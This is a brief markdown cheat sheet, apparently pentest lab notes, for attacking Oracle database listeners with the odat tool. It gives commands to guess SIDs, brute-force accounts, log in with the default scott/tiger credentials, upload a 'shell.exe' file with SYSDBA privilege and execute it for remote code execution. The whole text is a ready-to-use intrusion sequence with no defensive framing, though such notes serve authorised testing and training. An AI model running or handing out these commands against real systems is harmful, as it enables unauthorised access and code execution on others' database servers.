```md
# Reference
https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener

# Install odat.py
https://github.com/quentinhardy/odat

# Enumerate SID
sudo python3 ~/Tools/Oracle/odat/odat.py sidguesser -s $ip --sids-file ./sid.txt

# Enumerate User Accounts with SID
sudo python3 ~/Tools/Oracle/odat/odat.py all -s $ip -p 1521 --accounts-file ~/Tools/Oracle/odat/accounts/accounts.txt  

# Upload file with high privileges
sudo python3 ~/Tools/Oracle/odat/odat.py utlfile -s $ip -p 1521 -U scott -P tiger -d XE --putFile 'C:\Windows\Temp\' 'shell.exe' shell.exe --sysdba

# Execute File with High Privileges RCE
sudo python3 ~/Tools/Oracle/odat/odat.py dbmsscheduler -s $ip -p 1521 -U scott -P tiger -d XE --exec 'C:\Windows\Temp\shell.exe' --sysdba
```